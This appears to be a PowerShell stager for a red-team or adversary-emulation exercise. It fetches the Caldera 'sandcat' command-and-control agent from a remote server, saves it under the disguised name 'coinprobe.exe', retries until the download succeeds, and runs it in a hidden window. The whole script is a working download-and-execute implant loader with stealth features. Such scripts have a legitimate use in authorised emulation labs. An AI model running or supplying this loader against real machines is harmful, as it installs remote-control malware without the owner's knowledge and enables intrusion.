$server = "http://198.18.14.2:8888"
$url = "$server/file/download"
$targetPath = "C:\Users\donot-change\coinprobe.exe"
$group = "coinworm"
$retryInterval = 30  # seconds

# Check if agent process is already running
if (Get-Process | Where-Object { $_.Path -eq $targetPath }) {
    Write-Host "Agent is already running. Exiting script."
    exit 0
}

# If agent not running, try to download agent with retries until success
while ($true) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("platform", "windows")
        $wc.Headers.Add("file", "sandcat.go")
        $data = $wc.DownloadData($url)

        # Write the downloaded data to the target path
        [IO.File]::WriteAllBytes($targetPath, $data) | Out-Null

        Write-Host "Agent downloaded successfully."
        break  # exit retry loop
    }
    catch {
        Write-Host "[-] Caldera not reachable. Retrying in $retryInterval seconds..."
        Start-Sleep -Seconds $retryInterval
    }
}

# Start the agent process
Start-Process -FilePath $targetPath -ArgumentList "-server $server -group $group" -WindowStyle Hidden
Write-Host "Agent started."
